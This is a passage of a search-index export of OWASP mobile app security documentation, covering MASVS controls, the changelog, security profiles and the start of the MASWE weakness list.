sensitive data leakage and functionality exposure, and secure display of sensitive data in the app's user interface. By implementing these controls, mobile app developers can safeguard sensitive user information and prevent unauthorized access by attackers.</p> ID statement MASVS-PLATFORM-1 The app uses IPC mechanisms securely. MASVS-PLATFORM-2 The app uses WebViews securely. MASVS-PLATFORM-3 The app uses the user interface securely. <p></p>","tags":[]},{"location":"MASVS/10-MASVS-CODE/","title":"MASVS-CODE: Code Quality","text":"<p>Mobile apps have many data entry points, including the UI, IPC, network, and file system, which might receive data that has been inadvertently modified by untrusted actors. By treating this data as untrusted input and properly verifying and sanitizing it before use, developers can prevent classical injection attacks, such as SQL injection, XSS, or insecure deserialization. However, other common coding vulnerabilities, such as memory corruption flaws, are hard to detect in penetration testing but easy to prevent with secure architecture and coding practices. Developers should follow best practices such as the OWASP Software Assurance Maturity Model (SAMM) and NIST.SP.800-218 Secure Software Development Framework (SSDF) to avoid introducing these flaws in the first place.</p> <p>This category covers coding vulnerabilities that arise from external sources such as app data entry points, the OS, and third-party software components. Developers should verify and sanitize all incoming data to prevent injection attacks and bypass of security checks. They should also enforce app updates and ensure that the app runs up-to-date platforms to protect users from known vulnerabilities.</p> ID statement MASVS-CODE-1 The app requires an up-to-date platform version. MASVS-CODE-2 The app has a mechanism for enforcing app updates. MASVS-CODE-3 The app only uses software components without known vulnerabilities. MASVS-CODE-4 The app validates and sanitizes all untrusted inputs. <p></p>","tags":[]},{"location":"MASVS/11-MASVS-RESILIENCE/","title":"MASVS-RESILIENCE: Resilience Against Reverse Engineering and Tampering","text":"<p>Defense-in-depth measures such as code obfuscation, anti-debugging, anti-tampering, etc. are important to increase app resilience against reverse engineering and specific client-side attacks. They add multiple layers of security controls to the app, making it more difficult for attackers to successfully reverse engineer and extract valuable intellectual property or sensitive data from it, which could result in:</p> <ul> <li>The theft or compromise of valuable business assets such as proprietary algorithms, trade secrets, or customer data</li> <li>Significant financial losses due to loss of revenue or legal action</li> <li>Legal and reputational damage due to breach of contracts or regulations</li> <li>Damage to brand reputation due to negative publicity or customer dissatisfaction</li> </ul> <p>The controls in this category aim to ensure that the app is running on a trusted platform, prevent tampering at runtime and ensure the integrity of the app's intended functionality. Additionally, the controls impede comprehension by making it difficult to figure out how the app works using static analysis and prevent dynamic analysis and instrumentation that could allow an attacker to modify the code at runtime.</p> <p>Note, however, that the absence of any of these measures does not necessarily cause vulnerabilities - instead, they provide additional threat-specific protection. All apps must also fulfill the rest of the OWASP MASVS security controls according to their specific threat models.</p> ID statement MASVS-RESILIENCE-1 The app validates the integrity of the platform. MASVS-RESILIENCE-2 The app implements anti-tampering mechanisms. MASVS-RESILIENCE-3 The app implements anti-static analysis mechanisms. MASVS-RESILIENCE-4 The app implements anti-dynamic analysis techniques. <p></p>","tags":[]},{"location":"MASVS/12-MASVS-PRIVACY/","title":"MASVS-PRIVACY: Privacy","text":"<p>The main goal of MASVS-PRIVACY is to provide a baseline for user privacy. It is not intended to cover all aspects of user privacy, especially when other standards and regulations such as ENISA or the GDPR already do that. We focus on the app itself, looking at what can be tested using information that's publicly available or found within the app through methods like static or dynamic analysis.</p> <p>While some associated tests can be automated, others necessitate manual intervention due to the nuanced nature of privacy. For example, if an app collects data that it didn't mention in the app store or its privacy policy, it takes careful manual checking to spot this.</p> <p>Note on \"Data Collection and Sharing\":For the MASTG tests, we treat \"Collect\" and \"Share\" in a unified manner. This means that whether the app is sending data to another server or transferring it to another app on the device, we view it as data that's potentially leaving the user's control. Validating what happens to the data on remote endpoints is challenging and often not feasible due to access restrictions and the dynamic nature of server-side operations. Therefore, this issue is outside of the scope of the MASVS.</p> <p>IMPORTANT DISCLAIMER:</p> <p>MASVS-PRIVACY is not intended to serve as an exhaustive or exclusive reference. While it provides valuable guidance on app-centric privacy considerations, it should never replace comprehensive assessments, such as a Data Protection Impact Assessment (DPIA) mandated by the General Data Protection Regulation (GDPR) or other pertinent legal and regulatory frameworks. Stakeholders are strongly advised to undertake a holistic approach to privacy, integrating MASVS-PRIVACY insights with broader assessments to ensure comprehensive data protection compliance. Given the specialized nature of privacy regulations and the complexity of data protection, these assessments are best conducted by privacy experts rather than security experts.</p> ID statement MASVS-PRIVACY-1 The app minimizes access to sensitive data and resources. MASVS-PRIVACY-2 The app prevents identification of the user. MASVS-PRIVACY-3 The app is transparent about data collection and usage. MASVS-PRIVACY-4 The app offers user control over their data. <p></p>","tags":[]},{"location":"MASVS/CHANGELOG/","title":"Changelog","text":"","tags":[]},{"location":"MASVS/CHANGELOG/#v131-and-newer","title":"V1.3.1 and newer","text":"<p>All our Changelogs are available online at the OWASP MASVS GitHub repository, see the Releases page.</p>","tags":[]},{"location":"MASVS/CHANGELOG/#v13-13-may-2021","title":"V1.3 - 13 May 2021","text":"<p>We are proud to announce the introduction of a new document build pipeline, which is a major milestone for our project. The build pipeline is based on Pandocker and Github Actions. This significantly reduces the time spent on creating new releases and will also be the foundation for the OWASP MSTG and will be made available for the OWASP ASVS project.</p>","tags":[]},{"location":"MASVS/CHANGELOG/#changes","title":"Changes","text":"<ul> <li>4 more translations are available, which are Hindi, Farsi, Portuguese and Brazilian Portuguese</li> <li>Added requirement MSTG-PLATFORM-11</li> </ul>","tags":[]},{"location":"MASVS/CHANGELOG/#special-thanks","title":"Special Thanks","text":"<ul> <li>Jeroen Willemsen for kick-starting this initiative last year!</li> <li>Damien Clochard and Dalibo for supporting and professionalizing the build pipeline.</li> <li>All our Hindi, Farsi, Portuguese and Brazilian Portuguese collaborators for the excellent translation work.</li> </ul>","tags":[]},{"location":"MASVS/CHANGELOG/#v12-7-march-2020-international-release","title":"V1.2 - 7 March 2020 - International Release","text":"<p>The following changes are part of release 1.2:</p> <ul> <li>Translation in simplified Chinese of the MASVS available.</li> <li>Change of title in MASVS book cover.</li> <li>Removed Mobile Top 10 and CWE from MSTG and merged to existing references in MASVS.</li> </ul>","tags":[]},{"location":"MASVS/CHANGELOG/#v12-rc-5-october-2019-pre-release-english-only","title":"V1.2-RC - 5 October 2019 - Pre-release (English only)","text":"<p>The following changes are part of pre-release 1.2:</p> <ul> <li>Promoted to flagship status.</li> <li>Requirement changed: MSTG-STORAGE-1 \"need to be used\".</li> <li>Requirements MSTG-STORAGE-13, MSTG-STORAGE-14, and MSTG-STORAGE-15 are added with a focus on data protection.</li> <li>Requirement MSTG-AUTH-11 is updated to preserve contextual information.</li> <li>Requirement MSTG-CODE-4 is updated to cover more than just debugging.</li> <li>Requirement MSTG-PLATFORM-10 added to further secure usage of WebViews.</li> <li>Requirement MSTG-AUTH-12 added to remind developers of having authorizations implemented, especially in case of multi-user apps.</li> <li>Added a little more description on how the MASVS should be used given a risk assessment.</li> <li>Added a little more description on paid content.</li> <li>Requirement MSTG-ARCH-11 added to include a Responsible Disclosure policy for L2 applications.</li> <li>Requirement MSTG-ARCH-12 added to show application developers that relevant international privacy laws should be followed.</li> <li>Created a consistent style for all references in the English version.</li> <li>Requirement MSTG-PLATFORM-11 added to counter spying via third party keyboards.</li> <li>Requirement MSTG-MSTG-RESILIENCE-13 added to impede eavesdropping at an application.</li> </ul>","tags":[]},{"location":"MASVS/CHANGELOG/#v114-4-july-2019-summit-edition","title":"V1.1.4 - 4 July 2019 - Summit edition","text":"<p>The following changes are part of release 1.1.4:</p> <ul> <li>Fix all markdown issues.</li> <li>Updates in the French and Spanish translations.</li> <li>Translated the changelog to Chinese (ZHTW) and Japanese.</li> <li>Automated verification of the the markdown syntax and reachability of the URLs.</li> <li>Added identification codes to the requirements, which will be included in the future version of the MSTG in order to find the recommendations and testcases easily.</li> <li>Reduced the repo size and added Generated to the .gitignore.</li> <li>Added a Code of Conduct &amp; Contributing guidelines.</li> <li>Added a Pull-Request template.</li> <li>Updated the sync with the repo in use for hosting the Gitbook website.</li> <li>Updated the scripts to generate XML/JSON/CSV for all the translations.</li> <li>Translated the Foreword to Chinese (ZHTW).</li> </ul>","tags":[]},{"location":"MASVS/CHANGELOG/#v113-9-january-2019-small-fixes","title":"V1.1.3 - 9 January 2019 - Small fixes","text":"<ul> <li>Fix translation issue of requirement 7.1 in the Spanish version</li> <li>New setup of translators in acknowledgements</li> </ul>","tags":[]},{"location":"MASVS/CHANGELOG/#v112-3-january-2019-sponsorship-and-internationalization","title":"V1.1.2 - 3 January 2019 - Sponsorship and internationalization","text":"<p>The following changes are part of release 1.1.2:</p> <ul> <li>Added thank you note for buyers of the e-book.</li> <li>Added missing authentication link &amp; updated broken authentication link in V4.</li> <li>Fixed swap of 4.7 and 4.8 in English.</li> <li>First international release!</li> <li>Fixes in Spanish translation. Translation is now in sync with English (1.1.2).</li> <li>Fixes in Russian translation. Translation is now in sync with English (1.1.2).</li> <li>Added first release of Chinese (ZHTW) French, German, and Japanese!</li> <li>Simplified document for ease of translation.</li> <li>Added instructions for automated releases.</li> </ul>","tags":[]},{"location":"MASVS/CHANGELOG/#v110-14-july-2018","title":"V1.1.0 - 14 July 2018","text":"<p>The following changes are part of release 1.1:</p> <ul> <li>Requirement 2.6 \"The clipboard is deactivated on text fields that may contain sensitive data.\" was removed.</li> <li>Requirement 2.2 \"No sensitive data should be stored outside of the app container or system credential storage facilities.\" was added.</li> <li>Requirement 2.1 was reworded to \"System credential storage facilities are used appropriately to store sensitive data, such as PII, user credentials or cryptographic keys.\".</li> </ul>","tags":[]},{"location":"MASVS/CHANGELOG/#v10-12-january-2018","title":"V1.0 12 - January 2018","text":"<p>The following changes are part of release 1.0:</p> <ul> <li>Delete 8.9 as the same as 8.12</li> <li>Made 4.6 more generic</li> <li>Minor fixes (typos etc.)</li> </ul>","tags":[]},{"location":"MASVS/Mobile_App_Security_Model/","title":"Mobile Application Security Model","text":"<p>The MAS project defines several security testing profiles that businesses and developers can use to evaluate and improve the security of their mobile applications. However, it\u2019s important to note that implementing these profiles fully or partially should be a risk-based decision made in consultation with business owners.</p> <p>\\</p> <p>MAS-L1 - Baseline Security:</p> <p>MAS-L1 contains generic security controls recommended for all mobile apps. This profile considers co-installed apps as well as network-based attackers but assumes that the security controls of the mobile operating system are intact and that the end user is not viewed as a potential adversary. Fulfilling these controls results in a secure app that follows best practices and avoids common vulnerabilities.</p> <p>MAS-L2 - Defense-in-Depth:</p> <p>MAS-L2 adds additional defense-in-depth controls to protect against more sophisticated attacks. This profile assumes that the security controls of the mobile operating system might not be intact and that the app user can be considered as a potential adversary. It is appropriate for apps handling highly sensitive data, such as mobile banking apps.</p> <p>MAS-R - Resilience:</p> <p>MAS-R contains software protection controls to impede specific client-side threats where the end user is malicious and/or the mobile OS is compromised. These threats include tampering, modding, or reverse engineering to extract sensitive code or data. This level is applicable to apps that need to protect intellectual property such as gaming apps and enterprise apps that handle confidential or proprietary information.</p> <p>Note that MAS-R controls can ultimately be bypassed and should never be used as a replacement for proper security controls. Instead, they are intended to add additional threat-specific protective controls to apps that also fulfill the MASVS controls in MAS-L1 or MAS-L2.</p>","tags":[]},{"location":"MASVS/Mobile_App_Security_Model/#recommended-use","title":"Recommended Use","text":"<p>A risk assessment should be the first step before applying the MASVS. Apps can be verified against the different MAS profiles based on prior risk assessment and overall level of security required which will determine which MAS profile or profiles should be applied to the app. Note that combinations of profiles are possible:</p> <ul> <li>MAS-L1</li> <li>MAS-L1 + MAS-R</li> <li>MAS-L2</li> <li>MAS-L2 + MAS-R</li> </ul> <p>The different combinations reflect different grades of security and resilience. Threat model is essential to determine not only the profiles to be applied but also the controls and risks (represented by tests in the MASTG) that are applicable. When testing using a MAS profile you don't have to apply each and every test</p> <p>The goal is to allow for flexibility: For example, a mobile game might not warrant adding MAS-L2 security controls such as 2-factor authentication for usability reasons, but have a strong business need for tamper prevention.</p>","tags":[]},{"location":"MASVS/Mobile_App_Security_Model/#the-security-trade-offs","title":"The Security Trade-offs","text":"<p>Adding more security controls from higher MAS profiles can make the app more secure, but it also may increase the cost of development and may affect the user experience negatively.</p>","tags":[]},{"location":"MASVS/Mobile_App_Security_Model/#security-vs-cost","title":"Security vs Cost","text":"<p>In general, MAS profiles should be used whenever it makes sense from a risk vs. cost perspective (i.e., where the potential loss caused by a compromise of confidentiality or integrity is higher than the cost incurred by the additional security controls). The potential loss is the negative impact that a compromise of confidentiality or integrity would have on the app's users, data, functionality, reputation, or revenue. The cost of security controls is the amount of time, money, and resources that are needed to implement and maintain the security features. You need to estimate how likely it is that your app will be attacked, how severe the consequences would be if your app's data was compromised, and how much value your app provides to your users and your business.</p> <p>For example, if you are developing a mobile app that handles sensitive health data of your users, you might want to use MAS-L2 to ensure strong encryption and authentication features. The potential loss caused by a data breach would be very high in terms of user privacy, trust, and legal liability. The cost of implementing these security controls would be justified by the value and reputation of your app.</p> <p>On the other hand, if you are developing a mobile app that only displays public information such as weather forecasts or news articles, complying with MAS-L1 is usually enough. The potential loss caused by a data breach would be low in terms of user privacy and trust. The cost of implementing these security controls would not be worth the marginal benefit for your app.</p>","tags":[]},{"location":"MASVS/Mobile_App_Security_Model/#security-vs-usability","title":"Security vs Usability","text":"<p>Some security features may make the app more difficult or inconvenient to use, which may affect user satisfaction or retention. For example, requiring complex passwords or frequent verification may increase security, but also frustrate users who want a smooth and fast experience. Developers should predict and resolve conflicts between security and usability requirements during the app design process.</p>","tags":[]},{"location":"MASVS/Mobile_App_Security_Model/#security-vs-privacy","title":"Security vs Privacy","text":"<p>Some security features may require accessing or collecting user data, which may raise privacy concerns. For example, using SMS as multi-factor authentication may improve security, but also expose sensitive personal information (the user telephone number). Developers should balance the security and privacy needs of their users and comply with relevant laws and regulations.</p>","tags":[]},{"location":"MASVS/Mobile_App_Security_Model/#privacy-vs-value","title":"Privacy vs Value","text":"<p>Some apps may offer more value or functionality to users in exchange for accessing or sharing their data, which may compromise their privacy. For example, some apps may provide personalized recommendations or discounts based on user preferences or location data, but also expose users to targeted ads or third-party tracking. Developers should be aware that users will weigh the benefits and risks of downloading and using such apps based on their own privacy concerns.</p>","tags":[]},{"location":"MASVS/Mobile_App_Security_Model/#examples-of-use","title":"Examples of Use","text":"","tags":[]},{"location":"MASVS/Mobile_App_Security_Model/#masvs-l1","title":"MASVS-L1","text":"<ul> <li>All mobile apps. MASVS-L1 lists security best practices that can be followed with a reasonable impact on development cost and user experience. Apply the controls in MASVS-L1 for any app that don't qualify for one of the higher levels.</li> </ul>","tags":[]},{"location":"MASVS/Mobile_App_Security_Model/#masvs-l2","title":"MASVS-L2","text":"<ul> <li> <p>Health-Care Industry: Mobile apps that store personally identifiable information that can be used for identity theft, fraudulent payments, or a variety of fraud schemes. For the US healthcare sector, compliance considerations include the Health Insurance Portability and Accountability Act (HIPAA) Privacy, Security, Breach Notification Rules and Patient Safety Rule.</p> </li> <li> <p>Financial Industry: Apps that enable access to highly sensitive information like credit card numbers, personal information, or allow the user to move funds. These apps warrant additional security controls to prevent fraud. Financial apps need to ensure compliance to the Payment Card Industry Data Security Standard (PCI DSS), Gramm Leech Bliley Act and Sarbanes-Oxley Act (SOX).</p> </li> </ul>","tags":[]},{"location":"MASVS/Mobile_App_Security_Model/#masvs-l1r","title":"MASVS L1+R","text":"<ul> <li> <p>Mobile apps where Intellectual Property (IP) protection is a business goal. The resilience controls listed in MASVS-R can be used to increase the effort needed to obtain the original source code and to impede tampering / cracking.</p> </li> <li> <p>Gaming Industry: Games with an essential need to prevent modding and cheating, such as competitive online games. Cheating is an important issue in online games, as a large amount of cheaters leads to a disgruntled player base and can ultimately cause a game to fail. MASVS-R provides basic anti-tampering controls to help increase the effort for cheaters.</p> </li> </ul>","tags":[]},{"location":"MASVS/Mobile_App_Security_Model/#masvs-l2r","title":"MASVS L2+R","text":"<ul> <li> <p>Financial Industry: Online banking apps that allow the user to move funds, where techniques such as code injection and instrumentation on compromised devices pose a risk. In this case, controls from MASVS-R can be used to impede tampering, raising the bar for malware authors.</p> </li> <li> <p>All mobile apps that, by design, need to store sensitive data on the mobile device, and at the same time must support a wide range of devices and operating system versions. In this case, resilience controls can be used as a defense-in-depth measure to increase the effort for attackers aiming to extract the sensitive data.</p> </li> <li> <p>Apps with in-app purchases should ideally use server-side and MASVS-L2 controls to protect paid content. However, there may be cases where there is no possibility to use server-side protection. In those cases, MASVS-R controls should be additionally applied in order to increase the reversing and/or tampering effort.</p> </li> </ul>","tags":[]},{"location":"MASVS/controls/MASVS-AUTH-1/","title":"MASVS-AUTH-1","text":"<p>The app uses secure authentication and authorization protocols and follows the relevant best practices.</p> <p>Most apps connecting to a remote endpoint require user authentication and also enforce some kind of authorization. While the enforcement of these mechanisms must be on the remote endpoint, the apps also have to ensure that it follows all the relevant best practices to ensure a secure use of the involved protocols.</p>","tags":[]},{"location":"MASVS/controls/MASVS-AUTH-2/","title":"MASVS-AUTH-2","text":"<p>The app performs local authentication securely according to the platform best practices.</p> <p>Many apps allow users to authenticate via biometrics or a local PIN code. These authentication mechanisms need to be correctly implemented. Additionally, some apps might not have a remote endpoint, and rely fully on local app authentication.</p>","tags":[]},{"location":"MASVS/controls/MASVS-AUTH-3/","title":"MASVS-AUTH-3","text":"<p>The app secures sensitive operations with additional authentication.</p> <p>Some additional form of authentication is often desirable for sensitive actions inside the app. This can be done in different ways (biometric, pin, MFA code generator, email, deep links, etc) and they all need to be implemented securely.</p>","tags":[]},{"location":"MASVS/controls/MASVS-CODE-1/","title":"MASVS-CODE-1","text":"<p>The app requires an up-to-date platform version.</p> <p>Every release of the mobile OS includes security patches and new security features. By supporting older versions, apps stay vulnerable to well-known threats. This control ensures that the app is running on an up-to-date platform version so that users have the latest security protections.</p>","tags":[]},{"location":"MASVS/controls/MASVS-CODE-2/","title":"MASVS-CODE-2","text":"<p>The app has a mechanism for enforcing app updates.</p> <p>Sometimes critical vulnerabilities are discovered in the app when it is already in production. This control ensures that there is a mechanism to force the users to update the app before they can continue using it.</p>","tags":[]},{"location":"MASVS/controls/MASVS-CODE-3/","title":"MASVS-CODE-3","text":"<p>The app only uses software components without known vulnerabilities.</p> <p>To be truly secure, a full whitebox assessment should have been performed on all app components. However, as it usually happens with e.g. for third-party components this is not always feasible and not typically part of a penetration test. This control covers \"low-hanging fruit\" cases, such as those that can be detected just by scanning libraries for known vulnerabilities.</p>","tags":[]},{"location":"MASVS/controls/MASVS-CODE-4/","title":"MASVS-CODE-4","text":"<p>The app validates and sanitizes all untrusted inputs.</p> <p>Apps have many data entry points including the UI, IPC, the network, the file system, etc. This incoming data might have been inadvertently modified by untrusted actors and may lead to bypass of critical security checks as well as classical injection attacks such as SQL injection, XSS or insecure deserialization. This control ensures that this data is treated as untrusted input and is properly verified and sanitized before it's used.</p>","tags":[]},{"location":"MASVS/controls/MASVS-CRYPTO-1/","title":"MASVS-CRYPTO-1","text":"<p>The app employs current strong cryptography and uses it according to industry best practices.</p> <p>Cryptography plays an especially important role in securing the user's data - even more so in a mobile environment, where attackers having physical access to the user's device is a likely scenario. This control covers general cryptography best practices, which are typically defined in external standards.</p>","tags":[]},{"location":"MASVS/controls/MASVS-CRYPTO-2/","title":"MASVS-CRYPTO-2","text":"<p>The app performs key management according to industry best practices.</p> <p>Even the strongest cryptography would be compromised by poor key management. This control covers the management of cryptographic keys throughout their lifecycle, including key generation, storage and protection.</p>","tags":[]},{"location":"MASVS/controls/MASVS-NETWORK-1/","title":"MASVS-NETWORK-1","text":"<p>The app secures all network traffic according to the current best practices.</p> <p>Ensuring data privacy and integrity of any data in transit is critical for any app that communicates over the network. This is typically done by encrypting data and authenticating the remote endpoint, as TLS does. However, there are many ways for a developer to disable the platform secure defaults, or bypass them completely by using low-level APIs or third-party libraries. This control ensures that the app is in fact setting up secure connections in any situation.</p>","tags":[]},{"location":"MASVS/controls/MASVS-NETWORK-2/","title":"MASVS-NETWORK-2","text":"<p>The app performs identity pinning for all remote endpoints under the developer's control.</p> <p>Instead of trusting all the default root CAs of the framework or device, this control will make sure that only very specific CAs are trusted. This practice is typically called certificate pinning or public key pinning.</p>","tags":[]},{"location":"MASVS/controls/MASVS-PLATFORM-1/","title":"MASVS-PLATFORM-1","text":"<p>The app uses IPC mechanisms securely.</p> <p>Apps typically use platform provided IPC mechanisms to intentionally expose data or functionality. Both installed apps and the user are able to interact with the app in many different ways. This control ensures that all interactions involving IPC mechanisms happen securely.</p>","tags":[]},{"location":"MASVS/controls/MASVS-PLATFORM-2/","title":"MASVS-PLATFORM-2","text":"<p>The app uses WebViews securely.</p> <p>WebViews are typically used by apps that have a need for increased control over the UI. This control ensures that WebViews are configured securely to prevent sensitive data leakage as well as sensitive functionality exposure (e.g. via JavaScript bridges to native code).</p>","tags":[]},{"location":"MASVS/controls/MASVS-PLATFORM-3/","title":"MASVS-PLATFORM-3","text":"<p>The app uses the user interface securely.</p> <p>Sensitive data has to be displayed in the UI in many situations (e.g. passwords, credit card details, OTP codes in notifications). This control ensures that this data doesn't end up being unintentionally leaked due to platform mechanisms such as auto-generated screenshots or accidentally disclosed via e.g. shoulder surfing or sharing the device with another person.</p>","tags":[]},{"location":"MASVS/controls/MASVS-PRIVACY-1/","title":"MASVS-PRIVACY-1","text":"<p>The app minimizes access to sensitive data and resources.</p> <p>Apps should only request access to the data they absolutely need for their functionality and always with informed consent from the user. This control ensures that apps practice data minimization and restricts access control, reducing the potential impact of data breaches or leaks.</p>","tags":[]},{"location":"MASVS/controls/MASVS-PRIVACY-2/","title":"MASVS-PRIVACY-2","text":"<p>The app prevents identification of the user.</p> <p>Protecting user identity is crucial. This control emphasizes the use of unlinkability techniques like data abstraction, anonymization and pseudonymization to prevent user identification and tracking.</p>","tags":[]},{"location":"MASVS/controls/MASVS-PRIVACY-3/","title":"MASVS-PRIVACY-3","text":"<p>The app is transparent about data collection and usage.</p> <p>Users have the right to know how their data is being used. This control ensures that apps provide clear information about data collection, storage, and sharing practices, including any behavior a user wouldn't reasonably expect, such as background data collection. Apps should also adhere to platform guidelines on data declarations.</p>","tags":[]},{"location":"MASVS/controls/MASVS-PRIVACY-4/","title":"MASVS-PRIVACY-4","text":"<p>The app offers user control over their data.</p> <p>Users should have control over their data. This control ensures that apps provide mechanisms for users to manage, delete, and modify their data, and change privacy settings as needed (e.g. to revoke consent). Additionally, apps should re-prompt for consent and update their transparency disclosures when they require more data than initially specified.</p>","tags":[]},{"location":"MASVS/controls/MASVS-RESILIENCE-1/","title":"MASVS-RESILIENCE-1","text":"<p>The app validates the integrity of the platform.</p> <p>Running on a platform that has been tampered with can be very dangerous for apps, as this may disable certain security features, putting the data of the app at risk. Trusting the platform is essential for many of the MASVS controls relying on the platform being secure (e.g. secure storage, biometrics, sandboxing, etc.). This control tries to validate that the OS has not been compromised and its security features can thus be trusted.</p>","tags":[]},{"location":"MASVS/controls/MASVS-RESILIENCE-2/","title":"MASVS-RESILIENCE-2","text":"<p>The app implements anti-tampering mechanisms.</p> <p>Apps run on a user-controlled device, and without proper protections it's relatively easy to run a modified version locally (e.g. to cheat in a game, or enable premium features without paying), or upload a backdoored version of it to third-party app stores. This control tries to ensure the integrity of the app's intended functionality by preventing modifications to the original code and resources.</p>","tags":[]},{"location":"MASVS/controls/MASVS-RESILIENCE-3/","title":"MASVS-RESILIENCE-3","text":"<p>The app implements anti-static analysis mechanisms.</p> <p>Understanding the internals of an app is typically the first step towards tampering with it (either dynamically, or statically). This control tries to impede comprehension by making it as difficult as possible to figure out how an app works using static analysis.</p>","tags":[]},{"location":"MASVS/controls/MASVS-RESILIENCE-4/","title":"MASVS-RESILIENCE-4","text":"<p>The app implements anti-dynamic analysis techniques.</p> <p>Sometimes pure static analysis is very difficult and time consuming so it typically goes hand in hand with dynamic analysis. Observing and manipulating an app during runtime makes it much easier to decipher its behavior. This control aims to make it as difficult as possible to perform dynamic analysis, as well as prevent dynamic instrumentation which could allow an attacker to modify the code at runtime.</p>","tags":[]},{"location":"MASVS/controls/MASVS-STORAGE-1/","title":"MASVS-STORAGE-1","text":"<p>The app securely stores sensitive data.</p> <p>Apps handle sensitive data coming from many sources such as the user, the backend, system services or other apps on the device and usually need to store it locally. The storage locations may be private to the app (e.g. its internal storage) or be public and therefore accessible by the user or other installed apps (e.g. public folders such as Downloads). This control ensures that any sensitive data that is intentionally stored by the app is properly protected independently of the target location.</p>","tags":[]},{"location":"MASVS/controls/MASVS-STORAGE-2/","title":"MASVS-STORAGE-2","text":"<p>The app prevents leakage of sensitive data.</p> <p>There are cases when sensitive data is unintentionally stored or exposed to publicly accessible locations; typically as a side-effect of using certain APIs, system capabilities such as backups or logs. This control covers this kind of unintentional leaks where the developer actually has a way to prevent it.</p>","tags":[]},{"location":"MASWE/","title":"Mobile Application Security Weakness Enumeration (MASWE)","text":"Content in BETA <p>This content is in beta and still under active development, so it is subject to change any time (e.g. structure, IDs, content, URLs, etc.).</p> <p> Send Feedback</p> About the MASWE <p>The Mobile Application Security Weakness Enumeration (MASWE) is a list of common security and privacy weaknesses in mobile applications. It is intended to be used as a reference for developers, security researchers, and security professionals. It acts as the bridge between the MASVS and the MASTG.</p> <p> </p> <p>For its definition we draw inspiration from the Common Weakness Enumeration (CWE), which is a community-developed list of common software security weaknesses. The MASWE is intended to be a complementary list to the CWE, focusing specifically on security weaknesses in mobile applications.</p> <p>A weakness is a security or privacy issue that can be introduced into a mobile application. Weaknesses are categorized by the MASVS categories and controls. For example, a weakness related to the use of insecure random number generators is categorized under the <code>MASVS-CRYPTO-1</code> control.</p> <p>Each weakness contains the following information:</p> <ul> <li>Overview: A brief description of the weakness.</li> <li>Impact: The potential impact of the weakness on the security or privacy of the application.</li> <li>Modes of Introduction: The ways in which the weakness can be introduced into an application.</li> <li>Mitigations: Recommendations for mitigating the weakness.</li> </ul> <p>\"Weakness vs Vulnerability\": It is important to note that a weakness is not a vulnerability, but it can lead to the introduction of vulnerabilities. According to the CWE, a weakness is a condition in a software, firmware, hardware, or service component that, under certain circumstances, could contribute to the introduction of vulnerabilities. Whereas a vulnerability is a flaw in a software, firmware, hardware, or service component resulting from a weakness that can be exploited, causing a negative impact to the confidentiality, integrity, or availability of an impacted component or components.</p> ID Title Platform MASVS v2 ID L1 L2 R P Status MASWE-0096  Data Sent Unencrypted Over Encrypted Connections platform:android platform:ios MASVS-RESILIENCE-3 profile:R placeholderstatus:placeholder MASWE-0105  Integrity of App Resources Not Verified platform:android platform:ios MASVS-RESILIENCE-2 profile:R placeholderstatus:placeholder MASWE-0104  App Integrity Not Verified platform:android platform:ios MASVS-RESILIENCE-2 profile:R placeholderstatus:placeholder MASWE-0102  Dynamic Analysis Tools Detection Not Implemented platform:android platform:ios MASVS-RESILIENCE-4 profile:R placeholderstatus:placeholder MASWE-0099  Emulator Detection Not Implemented platform:android platform:ios MASVS-RESILIENCE-1 profile:R placeholderstatus:placeholder MASWE-0091  Anti-Deobfuscation Techniques Not Implemented platform:android platform:ios MASVS-RESILIENCE-3 profile:R placeholderstatus:placeholder MASWE-0094  Non-Production Resources Not Removed platform:android platform:ios MASVS-RESILIENCE-3 profile:R placeholderstatus:placeholder MASWE-0103  RASP Techniques Not Implemented platform:android platform:ios MASVS-RESILIENCE-4 profile:R placeholderstatus:placeholder MASWE-0092  Static Analysis Tools Not Prevented platform:android platform:ios MASVS-RESILIENCE-3 profile:R placeholderstatus:placeholder MASWE-0093  Debugging Symbols Not Removed platform:android platform:ios MASVS-RESILIENCE-3 profile:R placeholderstatus:placeholder MASWE-0107  Runtime Code Integrity Not Verified platform:android platform:ios MASVS-RESILIENCE-2 profile:R placeholderstatus:placeholder MASWE-0097  Root/Jailbreak Detection Not Implemented platform:android platform:ios MASVS-RESILIENCE-1 profile:R placeholderstatus:placeholder MASWE-0101  Debugger Detection Not Implemented platform:android platform:ios MASVS-RESILIENCE-4 profile:R placeholderstatus:placeholder MASWE-0100  Device Attestation Not Implemented platform:android platform:ios MASVS-RESILIENCE-1 profile:R placeholderstatus:placeholder MASWE-0095  Code That Disables Security Controls Not Removed platform:android platform:ios MASVS-RESILIENCE-3 profile:R placeholderstatus:placeholder MASWE-0008  Missing Device Secure Lock Verification Implementation platform:android platform:ios MASVS-RESILIENCE-1 profile:L2 placeholderstatus:placeholder MASWE-0089  Code Obfuscation Not Implemented platform:android platform:ios MASVS-RESILIENCE-3 profile:R placeholderstatus:placeholder MASWE-0106  Official Store Verification Not Implemented platform:android platform:ios MASVS-RESILIENCE-2 profile:R placeholderstatus:placeholder MASWE-0098  App Virtualization Environment Detection Not Implemented platform:android platform:ios MASVS-RESILIENCE-1 profile:R placeholderstatus:placeholder MASWE-0090  Resource Obfuscation Not Implemented platform:android platform:ios MASVS-RESILIENCE-3 profile:R placeholderstatus:placeholder MASWE-0112  Inadequate Data Collection Declarations platform:android platform:ios MASVS-PRIVACY-3 profile:P newstatus:new MASWE-0115  Inadequate or Ambiguous User Consent Mechanisms platform:android platform:ios MASVS-PRIVACY-4 profile:P newstatus:new MASWE-0109  Lack of Anonymization or Pseudonymisation Measures platform:android platform:ios MASVS-PRIVACY-2 profile:P newstatus:new MASWE-0110  Use of Unique Identifiers for User Tracking platform:android platform:ios MASVS-PRIVACY-2 profile:P newstatus:new MASWE-0113  Lack of Proper Data Management Controls platform:android platform:ios MASVS-PRIVACY-4 profile:P newstatus:new MASWE-0111  Inadequate Privacy Policy platform:android platform:ios MASVS-PRIVACY-3 profile:P newstatus:new MASWE-0108  Sensitive Data in Network Traffic platform:android platform:ios MASVS-PRIVACY-1 profile:P newstatus:new MASWE-0117  Inadequate Permission Management platform:android platform:ios MASVS-PRIVACY-1 profile:P newstatus:new MASWE-0114  Inadequate Data Visibility Controls platform:android platform:ios MASVS-PRIVACY-4 profile:P newstatus:new MASWE-0087  Insecure Parsing and Escaping platform:android platform:ios MASVS-CODE-4 profile:L2 placeholderstatus:placeholder MASWE-0083  Unsafe Handling of Data From The User Interface platform:android platform:ios MASVS-CODE-4 profile:L1 profile:L2 placeholderstatus:placeholder 